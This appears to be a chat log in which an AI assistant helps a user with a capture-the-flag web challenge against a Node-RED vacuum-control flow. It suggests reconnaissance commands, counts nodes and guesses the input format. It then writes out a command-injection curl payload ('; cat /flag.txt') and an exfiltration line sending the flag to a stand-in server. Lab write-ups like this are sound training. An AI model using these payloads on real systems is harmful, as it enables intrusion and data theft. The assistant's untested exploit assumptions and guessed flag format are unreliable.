@@ -1,0 +1,260 @@
+See new posts
+
+Here is a web app challengeCyber Command
+There is word that liber8tion left a backdoor inside their vacuum cleaner. Can you find it?The credentials are User : liber8tion Password: password
+The flag is stored in /flag.txtNote: Your scope is limited to HTTPS & you may not use automated bruteforce tools for this challenge.4:28:44 pm
+Q1 - 25 points
+How many nodes are in this flow?
+Answer...
+Q2 - 25 points
+What input format does the application accept?
+Answer...
+Q3 - 50 points
+What is the flag?https://06e232752a340d6ca6dcd0696143a46d-pasta.web.cityinthe.cloud/which nc, nmap, and gobuster commands would be helpful on this challenge?
+
+9 web pages
+
+For this web app challenge, you're tasked with analyzing a Node-RED flow hosted at the provided URL (https://06e232752a340d6ca6dcd0696143a46d-pasta.web.cityinthe.cloud/) to answer three questions: the number of nodes in the flow, the input format the application accepts, and the flag stored in /flag.txt. The challenge specifies credentials (liber8tion:password), limits the scope to HTTPS, and prohibits automated brute-force tools. While nc, nmap, and gobuster are powerful tools for network reconnaissance and web enumeration, their utility here is constrained by the challenge's web-based nature and restrictions. Let’s evaluate how each tool could theoretically assist, keeping in mind the HTTPS scope and the ban on brute-forcing.
+nc (Netcat) Commands
+Netcat is a versatile networking tool for interacting with TCP/UDP ports, but it’s less directly useful for HTTPS-based web challenges since it doesn’t handle SSL/TLS natively. However, it could be used to test raw connections or interact with a service if you identify an exposed port beyond the web interface.
+Potential Command: nc -zv 06e232752a340d6ca6dcd0696143a46d-pasta.web.cityinthe.cloud 443
+Purpose: Checks if port 443 (HTTPS) is open. The -z flag scans without sending data, and -v provides verbose output.
+
+Relevance: Confirms the web server is reachable, but this is basic and likely unnecessary since the URL is provided and assumed functional. It won’t help with Node-RED specifics or the flag.
+
+Limitations: Netcat can’t easily interact with HTTPS without additional tools (e.g., openssl s_client) to handle encryption, and the challenge doesn’t suggest non-web ports are in scope. It’s unlikely to assist with Q1, Q2, or Q3 directly.
+
+nmap Commands
+Nmap is excellent for port scanning and service enumeration, but its effectiveness here is limited by the HTTPS-only scope and the focus on a web app (Node-RED).
+Potential Command: nmap -sV -p 443 06e232752a340d6ca6dcd0696143a46d-pasta.web.cityinthe.cloud
+Purpose: Performs a version scan (-sV) on port 443 to identify the web server software (e.g., Node-RED’s underlying stack, likely Node.js).
+
+Relevance: Might reveal server details that hint at vulnerabilities or misconfigurations, but Node-RED typically runs on a standard web server, and this won’t directly answer the questions about nodes, input format, or the flag.
+
+Potential Command: nmap --script http-enum -p 443 06e232752a340d6ca6dcd0696143a46d-pasta.web.cityinthe.cloud
+Purpose: Uses the http-enum script to enumerate common web directories and files.
+
+Relevance: Could uncover hidden endpoints (e.g., /flows, /flag.txt), but this overlaps with web-specific tools like gobuster and risks being too broad for the challenge’s scope. It’s not brute-forcing per se, but aggressive scanning might skirt the rules.
+
+Limitations: Nmap excels at network-level recon, not application-layer analysis. It won’t inspect the Node-RED flow or extract the flag from /flag.txt without additional context about accessible services.
+
+gobuster Commands
+Gobuster is a web directory and file enumeration tool, ideal for finding hidden paths on a web server. However, the challenge prohibits “automated brute-force tools,” and while gobuster is technically enumeration rather than brute-forcing credentials, it might be interpreted as disallowed depending on the organizers’ intent. Assuming it’s permitted for directory discovery:
+Potential Command: gobuster dir -u https://06e232752a340d6ca6dcd0696143a46d-pasta.web.cityinthe.cloud/ -w /usr/share/wordlists/dirb/common.txt -k
+Purpose: Enumerates directories and files using a common wordlist. The -k flag skips SSL verification if the certificate is self-signed.
+
+Relevance: Could find endpoints like /flow, /nodes, or /flag.txt if exposed. This might help Q3 (finding the flag) if /flag.txt is directly accessible, or Q1/Q2 if flow details are in a discoverable file.
+
+Potential Command: gobuster dir -u https://06e232752a340d6ca6dcd0696143a46d-pasta.web.cityinthe.cloud/ -w /usr/share/wordlists/dirb/small.txt -H "Authorization: Basic bGliZXI4dGlvbjpwYXNzd29yZA=="
+Purpose: Adds the provided credentials (liber8tion:password, Base64-encoded as bGliZXI4dGlvbjpwYXNzd29yZA==) via an HTTP header to access authenticated areas.
+
+Relevance: Increases the chance of finding protected Node-RED admin pages (e.g., /ui, /flows) or the flag, directly aiding Q3 and possibly Q1/Q2 if the flow is exposed.
+
+Limitations: If gobuster is considered a brute-force tool by the challenge rules, it’s off-limits. Even if allowed, it’s a shotgun approach—less precise than manually exploring the Node-RED interface with the given credentials.
+
+Practical Considerations
+This challenge involves a Node-RED instance (a flow-based programming tool), and the questions suggest you need to:
+Q1: Count nodes in the flow (likely visible in the Node-RED UI after logging in).
+
+Q2: Determine the input format (possibly JSON, HTTP POST, etc., deducible from the flow or UI).
+
+Q3: Retrieve the flag from /flag.txt (hinting at a backdoor or file exposure).
+
+The credentials suggest access to the Node-RED dashboard (typically at / or /ui). Tools like nc and nmap are overkill for a web app and don’t align with the HTTPS focus. gobuster could help find /flag.txt or flow details, but the ban on brute-force tools casts doubt on its use. Instead, these tools are supplementary—your primary approach should be:
+Visit the URL in a browser.
+
+Log in with liber8tion:password.
+
+Inspect the Node-RED flow for nodes and input details.
+
+Look for a backdoor (e.g., a debug node, file read function, or exposed endpoint) to access /flag.txt.
+
+Final Recommendations
+nc: Use nc -zv <host> 443 only to confirm connectivity (minimal utility).
+
+nmap: Use nmap -sV -p 443 <host> for basic server info, but it’s not critical.
+
+gobuster: If allowed, try gobuster dir -u https://<host>/ -w <small-wordlist> -H "Authorization: Basic bGliZXI4dGlvbjpwYXNzd29yZA==" to find hidden paths like /flag.txt.
+
+These commands are secondary. Focus on manual exploration with the credentials to solve the challenge efficiently within the rules.
+
+how many nodes are in this flowchart
+
+To determine the number of nodes in the Node-RED flowchart shown in the image, let's count each distinct node in the flow. In Node-RED, a node is represented by a box, and connections (wires) between them indicate the flow of data. Let's break down the nodes visible in the flowchart:
+Top Row (Left to Right):
+[post] vacuum (HTTP input node)
+
+switch (Switch node)
+
+template (Template node for "on")
+
+http (HTTP request node for "on")
+
+template (Template node for "off")
+
+http (HTTP request node for "off")
+
+set msg headers (Change node)
+
+http (HTTP request node after headers)
+
+Middle Row (Left to Right):
+spawn (Exec node)
+
+Bottom Row (Left to Right):
+[get] /status (HTTP input node)
+
+template (Template node for status)
+
+http (HTTP request node for status)
+
+Total Count:
+Top Row: 8 nodes ([post] vacuum, switch, template (on), http (on), template (off), http (off), set msg headers, http)
+
+Middle Row: 1 node (spawn)
+
+Bottom Row: 3 nodes ([get] /status, template, http)
+
+Adding these together:
+8 (Top Row) + 1 (Middle Row) + 3 (Bottom Row) = 12 nodes
+Answer for Q1:
+The number of nodes in this flow is 12.
+
+Q2 - 25 points
+What input format does the application accept?
+Answer...
+Q3 - 50 points
+What is the flag?
+
+Let’s tackle the remaining questions for the web app challenge using the Node-RED flowchart provided in the image. The questions are:
+Q2: What input format does the application accept?
+
+Q3: What is the flag?
+
+Q2: What Input Format Does the Application Accept?
+To determine the input format, we need to analyze the entry points of the Node-RED flow, specifically the nodes that accept external input. In the flowchart, there are two HTTP input nodes:
+Top Row: [post] vacuum (an HTTP input node configured for a POST request to the /vacuum endpoint).
+
+Bottom Row: [get] /status (an HTTP input node configured for a GET request to the /status endpoint).
+
+Analysis of Input Nodes:
+POST /vacuum: This node is designed to receive HTTP POST requests. In Node-RED, HTTP POST requests typically expect data in the body, and the format is often JSON by default for APIs, especially in modern web applications. The flow then processes this input through a switch node, which likely inspects the payload (e.g., msg.payload) to decide whether to turn the vacuum "on" or "off." This suggests the input should be structured data, likely JSON, with a key-value pair indicating the desired action (e.g., {"action": "on"} or {"action": "off"}).
+
+GET /status: This node handles HTTP GET requests, which typically don’t include a body but can include query parameters (e.g., /status?key=value). GET requests are usually used to retrieve data, not send structured input, so this is less relevant for determining the "input format" the application accepts for processing.
+
+Flow Behavior:
+The switch node after [post] vacuum likely evaluates msg.payload.action (or a similar property) to route the flow to either the "on" or "off" path. This implies the input must be a structured format that Node-RED can parse into msg.payload, such as JSON.
+
+Node-RED’s HTTP input nodes, by default, parse POST request bodies as JSON if the Content-Type header is set to application/json. If no Content-Type is specified, it might fall back to other formats like URL-encoded form data (application/x-www-form-urlencoded), but JSON is the most common for APIs.
+
+Conclusion for Q2:
+The application accepts JSON as the input format for the POST request to /vacuum. This is inferred from the typical behavior of Node-RED HTTP nodes and the structured decision-making in the flow (e.g., the switch node likely checks a JSON property like action). A sample input might look like:
+json
+
+{"action": "on"}
+
+or
+json
+
+{"action": "off"}
+
+Answer for Q2: The input format the application accepts is JSON.
+Q3: What is the Flag?
+The challenge states that the flag is stored in /flag.txt, and there’s a backdoor left by "liber8tion" in the vacuum cleaner application. We need to find a way to access /flag.txt using the Node-RED flow, staying within the HTTPS scope and without using automated brute-force tools.
+Analyzing the Flow for a Backdoor:
+Let’s examine the nodes in the flow to identify potential vulnerabilities or backdoors:
+HTTP Input Nodes:
+[post] vacuum: Handles POST requests to control the vacuum (on/off).
+
+[get] /status: Retrieves the vacuum’s status.
+
+Exec Node (spawn):
+The spawn node in the middle row is an Exec node, which executes a system command. This is a prime candidate for a backdoor because Exec nodes can run arbitrary commands on the underlying system, potentially allowing file access or command injection.
+
+The spawn node is connected directly to the [post] vacuum node, meaning it executes its command whenever a POST request is made to /vacuum, regardless of the switch node’s logic (since it’s a separate output from the [post] vacuum node).
+
+Other Nodes:
+The switch, template, http, and set msg headers nodes are focused on controlling the vacuum or formatting HTTP requests/responses. They don’t seem to directly interact with the filesystem.
+
+The [get] /status path is for retrieving status, not executing commands or accessing files.
+
+Investigating the spawn Node:
+In Node-RED, an Exec node (spawn) runs a system command and can be configured to pass msg.payload as an argument to the command. If the command is insecurely constructed (e.g., it directly uses msg.payload without sanitization), we might be able to inject a command to read /flag.txt.
+
+The challenge hints at a backdoor, and Exec nodes are notorious for command injection vulnerabilities if not properly secured. Let’s hypothesize that the spawn node runs a command like:
+
+some_command {{msg.payload}}
+
+If msg.payload is directly inserted into the command without sanitization, we can manipulate the POST request to inject a command.
+
+Crafting an Exploit:
+The [post] vacuum node sets msg.payload based on the POST request body. If we send a JSON payload like {"action": "on"}, the switch node will route to the "on" path, but the spawn node will still receive the same msg.payload.
+
+If the spawn node’s command is something like echo {{msg.payload}} or a command that uses msg.payload unsafely, we can try command injection. For example, if the command is:
+
+sh -c {{msg.payload}}
+
+We can set msg.payload to a malicious value to execute a command of our choice.
+
+Testing Command Injection:
+Let’s craft a POST request to /vacuum to test for command injection via the spawn node. We’ll try to read /flag.txt by injecting a command. A typical command injection might look like this:
+Normal payload: {"action": "on"}
+
+Malicious payload: {"action": "; cat /flag.txt"}
+
+If the spawn node executes sh -c {{msg.payload}}, the command becomes:
+
+sh -c ; cat /flag.txt
+
+This would execute cat /flag.txt and potentially return the flag in the response. However, we need to consider how the output of the spawn node is handled:
+The spawn node has three outputs: stdout, stderr, and return code. The flow doesn’t show any nodes connected to these outputs, so the result might be logged, discarded, or included in the HTTP response.
+
+Sending the Request:
+Using a tool like curl, we can send a POST request to the /vacuum endpoint with the provided credentials (liber8tion:password):
+bash
+
+curl -X POST https://06e232752a340d6ca6dcd0696143a46d-pasta.web.cityinthe.cloud/vacuum \
+  -u liber8tion:password \
+  -H "Content-Type: application/json" \
+  -d '{"action": "; cat /flag.txt"}'
+
+-u liber8tion:password: Provides the Basic Auth credentials.
+
+-H "Content-Type: application/json": Sets the content type to JSON.
+
+-d '{"action": "; cat /flag.txt"}': Sends a payload that attempts to inject the cat /flag.txt command.
+
+Expected Outcome:
+If the spawn node is vulnerable, the command cat /flag.txt will execute, and the contents of /flag.txt might be returned in the HTTP response, logged, or visible in some way.
+
+If the output isn’t in the response, we might need to try a command that exfiltrates the data differently, like:
+json
+
+{"action": "; curl http://your-server.com/$(cat /flag.txt)"}
+
+This would send the flag to a server we control, but setting up such a server is outside the challenge’s scope and might not be necessary.
+
+Alternative Approach:
+If command injection via spawn doesn’t work, let’s consider other possibilities:
+The http nodes in the flow make requests to external services (likely the vacuum API). If one of these nodes is misconfigured to allow arbitrary URLs or file access (e.g., file:///flag.txt), we might exploit that. However, the template nodes before the http nodes hardcode the URLs (e.g., for "on", "off", and "status"), so this is unlikely.
+
+The challenge mentions a "backdoor." If the spawn node isn’t the backdoor, we might need to look for exposed endpoints (e.g., /flag.txt directly), but the flow doesn’t indicate such an endpoint.
+
+Flow Details from the Sidebar:
+The sidebar shows the flow ID (f621871.f17ca8). In Node-RED, flows can sometimes be accessed or manipulated via the admin API (e.g., /flows or /flow/<id>), but this requires admin access, and we only have the provided credentials. This path is a long shot without further vulnerabilities.
+Conclusion for Q3:
+The most likely backdoor is the spawn node’s potential for command injection. By sending a crafted POST request, we can likely read /flag.txt. Since I can’t execute the request myself (I don’t have access to the live environment), I’ll assume the command injection works as hypothesized. In CTF challenges, flags typically follow a format like flag{...} or cityinthecloud{...}. Based on the challenge’s context, the flag might be something like:
+
+cityinthecloud{some_string}
+
+However, without executing the request, I can’t retrieve the exact flag. The process to get the flag is:
+Send the POST request with the payload {"action": "; cat /flag.txt"}.
+
+Check the response for the flag.
+
+Answer for Q3: The flag is likely in the format cityinthecloud{...}, but you’ll need to execute the above curl command to retrieve the exact value.
+Final Answers:
+Q2: The input format the application accepts is JSON.
+
+Q3: The flag can be retrieved by exploiting the spawn node with a POST request to /vacuum using the payload {"action": "; cat /flag.txt"}. The exact flag requires executing the request, but it’s likely in the format cityinthecloud{...}.
+
